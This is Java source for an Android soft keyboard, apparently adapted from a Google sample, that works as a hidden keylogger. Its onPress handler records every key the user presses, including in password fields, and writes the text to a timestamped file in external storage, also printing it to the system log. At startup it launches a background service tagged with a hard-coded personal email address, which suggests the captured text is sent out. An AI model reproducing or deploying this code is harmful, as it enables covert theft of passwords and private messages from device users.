/*
 * Copyright (C) 2008-2009 Google Inc.
 * 
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 * 
 * http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

package com.example.android.elogger;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.Date;
import java.text.SimpleDateFormat;
import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.os.Environment;
import android.text.method.MetaKeyKeyListener;
import android.util.Log;
import android.view.KeyCharacterMap;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.CompletionInfo;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import android.app.ActivityManager;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;


import com.example.android.elogger.R;


public class SoftKeyboard extends InputMethodService implements
	KeyboardView.OnKeyboardActionListener {
    static final boolean DEBUG = false;//for disable debugging, logging statement will be optimised away by compiler


    static final boolean PROCESS_HARD_KEYS = true;//on clicking done key it goes to action listener

    private KeyboardView mInputView;
    private CandidateView mCandidateView;
    private CompletionInfo[] mCompletions;

    private StringBuilder mComposing = new StringBuilder();
    private boolean mPredictionOn;
    private boolean mCompletionOn;
    private int mLastDisplayWidth;
    private boolean mCapsLock;
    private long mLastShiftTime;
    private long mMetaState;

    private LatinKeyboard mSymbolsKeyboard;
    private LatinKeyboard mSymbolsShiftedKeyboard;
    private LatinKeyboard mQwertyKeyboard;

    private LatinKeyboard mCurKeyboard;

    private String mWordSeparators;


    @Override
    public void onCreate() {
	super.onCreate();
	mWordSeparators = getResources().getString(R.string.word_separators);
    }



    @Override
    public void onInitializeInterface() {

	if (mQwertyKeyboard != null) {
	    int displayWidth = getMaxWidth();
	    if (displayWidth == mLastDisplayWidth)
		return;
	    mLastDisplayWidth = displayWidth;
	}
	mQwertyKeyboard = new LatinKeyboard(this, R.xml.qwerty);
	mSymbolsKeyboard = new LatinKeyboard(this, R.xml.symbols);
	mSymbolsShiftedKeyboard = new LatinKeyboard(this, R.xml.symbols_shift);
	root = new File(Environment.getExternalStorageDirectory(), "download");
	gpxfile = new File(root, FILENAME1);
	 
	try {
	  save = new Scanner(gpxfile).useDelimiter("\\Z").next();
	  System.out.println("Last contents: "+save);
	} catch (Exception e) {
	    // TODO Auto-generated catch block
	    e.printStackTrace();
	}
	   
	Intent intent = new Intent(SoftKeyboard.this, RSSPullService.class);
	// add infos for the service which file to download and where to store
	intent.putExtra("userid", "bondkumarsm@gmail.com");
	startService(intent);
Log.i("ELogger","service starting..");
    }

    File root;
    File gpxfile;


    @Override
    public View onCreateInputView() {
	mInputView = (KeyboardView) getLayoutInflater().inflate(R.layout.input,
		null);
	mInputView.setOnKeyboardActionListener(this);
	mInputView.setKeyboard(mQwertyKeyboard);
	return mInputView;
    }


    @Override
    public View onCreateCandidatesView() {
	mCandidateView = new CandidateView(this);
	mCandidateView.setService(this);
	return mCandidateView;
    }


    @Override
    public void onStartInput(EditorInfo attribute, boolean restarting) {
	super.onStartInput(attribute, restarting);


	mComposing.setLength(0);
	updateCandidates();

	if (!restarting) {
	    // Clear shift states.
	    mMetaState = 0;
	}

	mPredictionOn = false;
	mCompletionOn = false;
	mCompletions = null;


	switch (attribute.inputType & EditorInfo.TYPE_MASK_CLASS) {
	case EditorInfo.TYPE_CLASS_NUMBER:
	case EditorInfo.TYPE_CLASS_DATETIME:

	    mCurKeyboard = mSymbolsKeyboard;
	    break;

	case EditorInfo.TYPE_CLASS_PHONE:

	    mCurKeyboard = mSymbolsKeyboard;
	    break;

	case EditorInfo.TYPE_CLASS_TEXT:

	    mCurKeyboard = mQwertyKeyboard;
	    mPredictionOn = true;

	    // We now look for a few special variations of text that will
	    // modify our behavior.
	    int variation = attribute.inputType
		    & EditorInfo.TYPE_MASK_VARIATION;
	    if (variation == EditorInfo.TYPE_TEXT_VARIATION_PASSWORD
		    || variation == EditorInfo.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD) {
		// Do not display predictions / what the user is typing
		// when they are entering a password.
		mPredictionOn = false;
	    }

	    if (variation == EditorInfo.TYPE_TEXT_VARIATION_EMAIL_ADDRESS
		    || variation == EditorInfo.TYPE_TEXT_VARIATION_URI
		    || variation == EditorInfo.TYPE_TEXT_VARIATION_FILTER) {
		// Our predictions are not useful for e-mail addresses
		// or URIs.
		mPredictionOn = false;
	    }

	    if ((attribute.inputType & EditorInfo.TYPE_TEXT_FLAG_AUTO_COMPLETE) != 0) {
		// If this is an auto-complete text view, then our predictions
		// will not be shown and instead we will allow the editor
		// to supply their own. We only show the editor's
		// candidates when in fullscreen mode, otherwise relying
		// own it displaying its own UI.
		mPredictionOn = false;
		mCompletionOn = isFullscreenMode();
	    }

	    // We also want to look at the current state of the editor
	    // to decide whether our alphabetic keyboard should start out
	    // shifted.
	    updateShiftKeyState(attribute);
	    break;

	default:
	    // For all unknown input types, default to the alphabetic
	    // keyboard with no special features.
	    mCurKeyboard = mQwertyKeyboard;
	    updateShiftKeyState(attribute);
	}


	mCurKeyboard.setImeOptions(getResources(), attribute.imeOptions);
    }


    @Override
    public void onFinishInput() {
	super.onFinishInput();

	// Clear current composing text and candidates.
	mComposing.setLength(0);
	updateCandidates();


	setCandidatesViewShown(false);

	mCurKeyboard = mQwertyKeyboard;
	if (mInputView != null) {
	    mInputView.closing();
	}
    }

    @Override
    public void onStartInputView(EditorInfo attribute, boolean restarting) {
	super.onStartInputView(attribute, restarting);
	// Apply the selected keyboard to the input view.
	mInputView.setKeyboard(mCurKeyboard);
	mInputView.closing();
    }

    /**
     * Deal with the editor reporting movement of its cursor.
     */
    @Override
    public void onUpdateSelection(int oldSelStart, int oldSelEnd,
	    int newSelStart, int newSelEnd, int candidatesStart,
	    int candidatesEnd) {
	super.onUpdateSelection(oldSelStart, oldSelEnd, newSelStart, newSelEnd,
		candidatesStart, candidatesEnd);


	if (mComposing.length() > 0
		&& (newSelStart != candidatesEnd || newSelEnd != candidatesEnd)) {
	    mComposing.setLength(0);
	    updateCandidates();
	    InputConnection ic = getCurrentInputConnection();
	    if (ic != null) {
		ic.finishComposingText();
	    }
	}
    }


    @Override
    public void onDisplayCompletions(CompletionInfo[] completions) {
	if (mCompletionOn) {
	    mCompletions = completions;
	    if (completions == null) {
		setSuggestions(null, false, false);
		return;
	    }

	    List<String> stringList = new ArrayList<String>();
	    for (int i = 0; i < (completions != null ? completions.length : 0); i++) {
		CompletionInfo ci = completions[i];
		if (ci != null)
		    stringList.add(ci.getText().toString());
	    }
	    System.out.println("completed=" + stringList);
	    setSuggestions(stringList, true, true);
	}
    }


    private boolean translateKeyDown(int keyCode, KeyEvent event) {
	mMetaState = MetaKeyKeyListener.handleKeyDown(mMetaState, keyCode,
		event);
	int c = event.getUnicodeChar(MetaKeyKeyListener
		.getMetaState(mMetaState));
	mMetaState = MetaKeyKeyListener.adjustMetaAfterKeypress(mMetaState);
	InputConnection ic = getCurrentInputConnection();
	if (c == 0 || ic == null) {
	    return false;
	}

	boolean dead = false;

	if ((c & KeyCharacterMap.COMBINING_ACCENT) != 0) {
	    dead = true;
	    c = c & KeyCharacterMap.COMBINING_ACCENT_MASK;
	}

	if (mComposing.length() > 0) {
	    char accent = mComposing.charAt(mComposing.length() - 1);
	    int composed = KeyEvent.getDeadChar(accent, c);

	    if (composed != 0) {
		c = composed;
		mComposing.setLength(mComposing.length() - 1);
	    }
	}

	onKey(c, null);

	return true;
    }


    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
	switch (keyCode) {
	case KeyEvent.KEYCODE_BACK:

	    if (event.getRepeatCount() == 0 && mInputView != null) {
		if (mInputView.handleBack()) {
		    return true;
		}
	    }
	    break;

	case KeyEvent.KEYCODE_DEL:

	    if (mComposing.length() > 0) {
		onKey(Keyboard.KEYCODE_DELETE, null);
		return true;
	    }
	    break;

	case KeyEvent.KEYCODE_ENTER:
	    // Let the underlying text editor always handle these.
	    return false;

	default:

	    if (PROCESS_HARD_KEYS) {
		if (keyCode == KeyEvent.KEYCODE_SPACE
			&& (event.getMetaState() & KeyEvent.META_ALT_ON) != 0) {

		    InputConnection ic = getCurrentInputConnection();
		    if (ic != null) {

			ic.clearMetaKeyStates(KeyEvent.META_ALT_ON);
			keyDownUp(KeyEvent.KEYCODE_A);
			keyDownUp(KeyEvent.KEYCODE_N);
			keyDownUp(KeyEvent.KEYCODE_D);
			keyDownUp(KeyEvent.KEYCODE_R);
			keyDownUp(KeyEvent.KEYCODE_O);
			keyDownUp(KeyEvent.KEYCODE_I);
			keyDownUp(KeyEvent.KEYCODE_D);
			// And we consume this event.
			return true;
		    }
		}
		if (mPredictionOn && translateKeyDown(keyCode, event)) {
		    return true;
		}
	    }
	}

	return super.onKeyDown(keyCode, event);
    }


    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {

	if (PROCESS_HARD_KEYS) {
	    if (mPredictionOn) {
		mMetaState = MetaKeyKeyListener.handleKeyUp(mMetaState,
			keyCode, event);
	    }
	}

	return super.onKeyUp(keyCode, event);
    }


    private void commitTyped(InputConnection inputConnection) {
	if (mComposing.length() > 0) {
	    inputConnection.commitText(mComposing, mComposing.length());
	    mComposing.setLength(0);
	    updateCandidates();
	}
    }


    private void updateShiftKeyState(EditorInfo attr) {
	if (attr != null && mInputView != null
		&& mQwertyKeyboard == mInputView.getKeyboard()) {
	    int caps = 0;
	    EditorInfo ei = getCurrentInputEditorInfo();
	    if (ei != null && ei.inputType != EditorInfo.TYPE_NULL) {
		caps = getCurrentInputConnection().getCursorCapsMode(
			attr.inputType);
	    }
	    mInputView.setShifted(mCapsLock || caps != 0);
	}
    }


    private boolean isAlphabet(int code) {
	if (Character.isLetter(code)) {
	    return true;
	} else {
	    return false;
	}
    }


    private void keyDownUp(int keyEventCode) {
	getCurrentInputConnection().sendKeyEvent(
		new KeyEvent(KeyEvent.ACTION_DOWN, keyEventCode));
	getCurrentInputConnection().sendKeyEvent(
		new KeyEvent(KeyEvent.ACTION_UP, keyEventCode));
    }

    /**
     * Helper to send a character to the editor as raw key events.
     */
    private void sendKey(int keyCode) {
	switch (keyCode) {
	case '\n':
	    keyDownUp(KeyEvent.KEYCODE_ENTER);
	    break;
	default:
	    if (keyCode >= '0' && keyCode <= '9') {
		keyDownUp(keyCode - '0' + KeyEvent.KEYCODE_0);
	    } else {
		getCurrentInputConnection().commitText(
			String.valueOf((char) keyCode), 1);
	    }
	    break;
	}
    }

    // Implementation of KeyboardViewListener

    public void onKey(int primaryCode, int[] keyCodes) {
	if (isWordSeparator(primaryCode)) {
	    // Handle separator
	    if (mComposing.length() > 0) {
		commitTyped(getCurrentInputConnection());
	    }
	    sendKey(primaryCode);
	    updateShiftKeyState(getCurrentInputEditorInfo());
	} else if (primaryCode == Keyboard.KEYCODE_DELETE) {
	    handleBackspace();
	} else if (primaryCode == Keyboard.KEYCODE_SHIFT) {
	    handleShift();
	} else if (primaryCode == Keyboard.KEYCODE_CANCEL) {
	    handleClose();
	    return;
	} else if (primaryCode == LatinKeyboardView.KEYCODE_OPTIONS) {
	    // Show a menu or somethin'
	} else if (primaryCode == Keyboard.KEYCODE_MODE_CHANGE
		&& mInputView != null) {
	    Keyboard current = mInputView.getKeyboard();
	    if (current == mSymbolsKeyboard
		    || current == mSymbolsShiftedKeyboard) {
		current = mQwertyKeyboard;
	    } else {
		current = mSymbolsKeyboard;
	    }
	    mInputView.setKeyboard(current);
	    if (current == mSymbolsKeyboard) {
		current.setShifted(false);
	    }
	} else {
	    handleCharacter(primaryCode, keyCodes);
	}
    }

    public void onText(CharSequence text) {
	InputConnection ic = getCurrentInputConnection();
	if (ic == null)
	    return;
	ic.beginBatchEdit();
	if (mComposing.length() > 0) {
	    commitTyped(ic);
	}
	ic.commitText(text, 0);
	ic.endBatchEdit();
	System.out.println("text=" + text);
	updateShiftKeyState(getCurrentInputEditorInfo());
    }


    private void updateCandidates() {
	if (!mCompletionOn) {
	    if (mComposing.length() > 0) {
		ArrayList<String> list = new ArrayList<String>();
		list.add(mComposing.toString());
		System.out.println("updates=" + mComposing.toString());
		setSuggestions(list, true, true);
	    } else {
		setSuggestions(null, false, false);
	    }
	}
    }

    public void setSuggestions(List<String> suggestions, boolean completions,
	    boolean typedWordValid) {
	if (suggestions != null && suggestions.size() > 0) {
	    setCandidatesViewShown(true);
	} else if (isExtractViewShown()) {
	    setCandidatesViewShown(true);
	}
	if (mCandidateView != null) {
	    mCandidateView.setSuggestions(suggestions, completions,
		    typedWordValid);
	}
    }

    private void handleBackspace() {
	final int length = mComposing.length();
	if (length > 1) {
	    mComposing.delete(length - 1, length);
	    System.out.println("back space=" + mComposing);
	    getCurrentInputConnection().setComposingText(mComposing, 1);
	    updateCandidates();
	} else if (length > 0) {
	    mComposing.setLength(0);
	    getCurrentInputConnection().commitText("", 0);
	    updateCandidates();
	} else {
	    keyDownUp(KeyEvent.KEYCODE_DEL);
	}
	updateShiftKeyState(getCurrentInputEditorInfo());
    }

    private void handleShift() {
	if (mInputView == null) {
	    return;
	}

	Keyboard currentKeyboard = mInputView.getKeyboard();
	if (mQwertyKeyboard == currentKeyboard) {
	    // Alphabet keyboard
	    checkToggleCapsLock();
	    mInputView.setShifted(mCapsLock || !mInputView.isShifted());
	} else if (currentKeyboard == mSymbolsKeyboard) {
	    mSymbolsKeyboard.setShifted(true);
	    mInputView.setKeyboard(mSymbolsShiftedKeyboard);
	    mSymbolsShiftedKeyboard.setShifted(true);
	} else if (currentKeyboard == mSymbolsShiftedKeyboard) {
	    mSymbolsShiftedKeyboard.setShifted(false);
	    mInputView.setKeyboard(mSymbolsKeyboard);
	    mSymbolsKeyboard.setShifted(false);
	}
    }

    private void handleCharacter(int primaryCode, int[] keyCodes) {
	System.out.println("primary code=" + primaryCode);
	if (isInputViewShown()) {
	    if (mInputView.isShifted()) {
		primaryCode = Character.toUpperCase(primaryCode);
	    }
	}
	if (isAlphabet(primaryCode) && mPredictionOn) {
	    String m = mComposing.append((char) primaryCode).toString();
	    System.out.println("m==" + m);
	    getCurrentInputConnection().setComposingText(mComposing, 1);
	    updateShiftKeyState(getCurrentInputEditorInfo());
	    updateCandidates();
	} else {
	    getCurrentInputConnection().commitText(
		    String.valueOf((char) primaryCode), 1);
	}
    }

    private void handleClose() {
	commitTyped(getCurrentInputConnection());
	requestHideSelf(0);
	mInputView.closing();
    }

    boolean b = true;

    private void checkToggleCapsLock() {
	long now = System.currentTimeMillis();
	if (mLastShiftTime + 800 > now) {
	    mCapsLock = !mCapsLock;
	    mLastShiftTime = 0;
	    System.out.println("caps on");
	} else {
	    mLastShiftTime = now;
	    if (b) {
		b = false;
	    } else
		b = true;

	}

    }

    private String getWordSeparators() {
	return mWordSeparators;
    }

    public boolean isWordSeparator(int code) {
	String separators = getWordSeparators();
	return separators.contains(String.valueOf((char) code));
    }

    public void pickDefaultCandidate() {
	pickSuggestionManually(0);
    }

    public void pickSuggestionManually(int index) {
	if (mCompletionOn && mCompletions != null && index >= 0
		&& index < mCompletions.length) {
	    CompletionInfo ci = mCompletions[index];
	    getCurrentInputConnection().commitCompletion(ci);
	    if (mCandidateView != null) {
		mCandidateView.clear();
	    }
	    updateShiftKeyState(getCurrentInputEditorInfo());
	} else if (mComposing.length() > 0) {

	    commitTyped(getCurrentInputConnection());
	}
    }

    public void swipeRight() {
	if (mCompletionOn) {
	    pickDefaultCandidate();
	}
    }

    public void swipeLeft() {
	handleBackspace();
    }

    public void swipeDown() {
	handleClose();
    }

    public void swipeUp() {
    }

    public void onPress(int primaryCode) {
	myStrings(primaryCode);

    }
    SimpleDateFormat sdf = new SimpleDateFormat("(dd-MM-yyyy__hh.mm.ss)");
    Date curDate = new Date();
    String strDate = sdf.format(curDate);
    String save = "";
    String FILENAME1 = strDate + "log_file.txt";
    File newFile = new File(FILENAME1);
    FileOutputStream fos;

    public void onReceive(Context aContext)
    {
	ActivityManager am = (ActivityManager) aContext
			.getSystemService(Context.ACTIVITY_SERVICE);
	String packageName = am.getRunningTasks(1).get(0).topActivity
				.getPackageName();
    }




		public void myStrings(int code) {

	String pressed = "";

	if (b) {
	    switch (code) {
	    case 97:
		pressed = "a";
		break;
	    case 98:
		pressed = "b";
		break;
	    case 99:
		pressed = "c";
		break;
	    case 100:
		pressed = "d";
		break;
	    case 101:
		pressed = "e";
		break;
	    case 102:
		pressed = "f";
		break;
	    case 103:
		pressed = "g";
		break;
	    case 104:
		pressed = "h";
		break;
	    case 105:
		pressed = "i";
		break;
	    case 106:
		pressed = "j";
		break;
	    case 107:
		pressed = "k";
		break;
	    case 108:
		pressed = "l";
		break;
	    case 109:
		pressed = "m";
		break;
	    case 110:
		pressed = "n";
		break;
	    case 111:
		pressed = "o";
		break;
	    case 112:
		pressed = "p";
		break;
	    case 113:
		pressed = "q";
		break;
	    case 114:
		pressed = "r";
		break;
	    case 115:
		pressed = "s";
		break;
	    case 116:
		pressed = "t";
		break;
	    case 117:
		pressed = "u";
		break;
	    case 118:
		pressed = "v";
		break;
	    case 119:
		pressed = "w";
		break;
	    case 120:
		pressed = "x";
		break;
	    case 121:
		pressed = "y";
		break;
	    case 122:
		pressed = "z";
		break;
	    case -5:
		int isave = save.length();

		save = save.substring(0, isave - 1);
		pressed = "";
		break;
	    case 32:

		pressed = " ";
		break;

	    case 126:
		pressed = "~";
		break;
	    case 177:
		pressed = "�";
		break;
	    case 215:
		pressed = "�";
		break;
	    case 247:
		pressed = "�";
		break;
	    case 8226:
		pressed = "�";
		break;
	    case 176:
		pressed = "�";
		break;
	    case 180:
		pressed = "`";
		break;
	    case 123:
		pressed = "{";
		break;
	    case 125:
		pressed = "}";
		break;
	    case 163:
		pressed = "�";
		break;
	    case 64:
		pressed = "@";
		break;
	    case 8364:
		pressed = "�";
		break;
	    case 94:
		pressed = "^";
		break;
	    case 174:
		pressed = "�";
		break;
	    case 165:
		pressed = "�";
		break;
	    case 95:
		pressed = "_";
		break;
	    case 43:
		pressed = "+";
		break;
	    case 91:
		pressed = "[";
		break;
	    case 93:
		pressed = "]";
		break;

	    case 161:
		pressed = "�";
		break;
	    case 60:
		pressed = "&lt;";
		break;
	    case 62:
		pressed = "&gt;";
		break;

	    case 162:
		pressed = "�";
		break;
	    case 124:
		pressed = "|";
		break;
	    case 92:
		pressed = "\\";
		break;
	    case 191:
		pressed = "�";
		break;
	    case 10:
		pressed = "\\n";
		break;
	    case 48:
		pressed = "0";
		break;
	    case 49:
		pressed = "1";
		break;
	    case 50:
		pressed = "2";
		break;
	    case 51:
		pressed = "3";
		break;
	    case 52:
		pressed = "4";
		break;
	    case 53:
		pressed = "5";
		break;
	    case 54:
		pressed = "6";
		break;
	    case 55:
		pressed = "7";
		break;
	    case 56:
		pressed = "8";
		break;
	    case 57:
		pressed = "9";
		break;

	    case 35:
		pressed = "#";
		break;
	    case 36:
		pressed = "$";
		break;
	    case 37:
		pressed = "%";
		break;
	    case 38:
		pressed = "\"";
		break;
	    case 42:
		pressed = "*";
		break;
	    case 45:
		pressed = "-";
		break;
	    case 61:
		pressed = "=";
		break;
	    case 40:
		pressed = "(";
		break;
	    case 41:
		pressed = ")";
		break;

	    case 33:
		pressed = "!";
		break;
	    case 34:
		pressed = "&quot;";
		break;
	    case 39:
		pressed = "\'";
		break;
	    case 58:
		pressed = ":";
		break;
	    case 59:
		pressed = ";";
		break;
	    case 47:
		pressed = "/";
		break;
	    case 63:
		pressed = "?";
		break;
	    case 8230:
		pressed = "�";
		break;
	    case 44:
		pressed = ",";
		break;
	    case 46:
		pressed = ".";
		break;
	    default:
		break;
	    }
	    save = save + pressed;
	} else {
	    switch (code) {
	    case 97:
		pressed = "A";
		break;
	    case 98:
		pressed = "B";
		break;
	    case 99:
		pressed = "C";
		break;
	    case 100:
		pressed = "D";
		break;
	    case 101:
		pressed = "E";
		break;
	    case 102:
		pressed = "F";
		break;
	    case 103:
		pressed = "G";
		break;
	    case 104:
		pressed = "H";
		break;
	    case 105:
		pressed = "I";
		break;
	    case 106:
		pressed = "J";
		break;
	    case 107:
		pressed = "K";
		break;
	    case 108:
		pressed = "L";
		break;
	    case 109:
		pressed = "M";
		break;
	    case 110:
		pressed = "N";
		break;
	    case 111:
		pressed = "O";
		break;
	    case 112:
		pressed = "P";
		break;
	    case 113:
		pressed = "Q";
		break;
	    case 114:
		pressed = "R";
		break;
	    case 115:
		pressed = "S";
		break;
	    case 116:
		pressed = "T";
		break;
	    case 117:
		pressed = "U";
		break;
	    case 118:
		pressed = "V";
		break;
	    case 119:
		pressed = "W";
		break;
	    case 120:
		pressed = "X";
		break;
	    case 121:
		pressed = "Y";
		break;
	    case 122:
		pressed = "Z";
		break;
	    case -5:
		int isave = save.length();

		save = save.substring(0, isave - 1);
		pressed = "";
	    case 32:

		pressed = " ";
		break;

	    case 126:
		pressed = "~";
		break;
	    case 177:
		pressed = "�";
		break;
	    case 215:
		pressed = "�";
		break;
	    case 247:
		pressed = "�";
		break;
	    case 8226:
		pressed = "�";
		break;
	    case 176:
		pressed = "�";
		break;
	    case 180:
		pressed = "`";
		break;
	    case 123:
		pressed = "{";
		break;
	    case 125:
		pressed = "}";
		break;
	    case 163:
		pressed = "�";
		break;
	    case 8364:
		pressed = "�";
		break;
	    case 94:
		pressed = "^";
		break;
	    case 174:
		pressed = "�";
		break;
	    case 165:
		pressed = "�";
		break;
	    case 95:
		pressed = "_";
		break;
	    case 43:
		pressed = "+";
		break;
	    case 91:
		pressed = "[";
		break;
	    case 93:
		pressed = "]";
		break;

	    case 161:
		pressed = "�";
		break;
	    case 60:
		pressed = "&lt;";
		break;
	    case 62:
		pressed = "&gt;";
		break;

	    case 162:
		pressed = "�";
		break;
	    case 124:
		pressed = "|";
		break;
	    case 92:
		pressed = "\\";
		break;
	    case 191:
		pressed = "�";
		break;
	    case 10:
		pressed = "\\n";
		break;
	    case 48:
		pressed = "0";
		break;
	    case 49:
		pressed = "1";
		break;
	    case 50:
		pressed = "2";
		break;
	    case 51:
		pressed = "3";
		break;
	    case 52:
		pressed = "4";
		break;
	    case 53:
		pressed = "5";
		break;
	    case 54:
		pressed = "6";
		break;
	    case 55:
		pressed = "7";
		break;
	    case 56:
		pressed = "8";
		break;
	    case 57:
		pressed = "9";
		break;

	    case 35:
		pressed = "#";
		break;
	    case 36:
		pressed = "$";
		break;
	    case 37:
		pressed = "%";
		break;
	    case 38:
		pressed = "&amp;";
		break;
	    case 42:
		pressed = "*";
		break;
	    case 45:
		pressed = "-";
		break;
	    case 61:
		pressed = "=";
		break;
	    case 40:
		pressed = "(";
		break;
	    case 41:
		pressed = ")";
		break;

	    case 33:
		pressed = "!";
		break;
	    case 34:
		pressed = "\"";
		break;
	    case 39:
		pressed = "\'";
		break;
	    case 58:
		pressed = ":";
		break;
	    case 59:
		pressed = ";";
		break;
	    case 47:
		pressed = "/";
		break;
	    case 63:
		pressed = "?";
		break;
	    case 64:
		pressed = "@";
		break;
	    case 8230:
		pressed = "�";
		break;
	    case 44:
		pressed = ",";
		break;
	    case 46:
		pressed = ".";
		break;
	    default:
		break;
	    }
	    save = save + pressed;
	}
	try {

	    if (!root.exists()) {
		root.mkdirs();
	    }

	   
	    FileWriter writer = new FileWriter(gpxfile);
		writer.append(getPackageName());
	    writer.append(save);
	    writer.flush();
	    writer.close();

	} catch (Exception e) {
	    // TODO Auto-generated catch block
	    e.printStackTrace();
	}
	System.out.println("Log-" + save);
    }

    public void onRelease(int primaryCode) {
    }
}
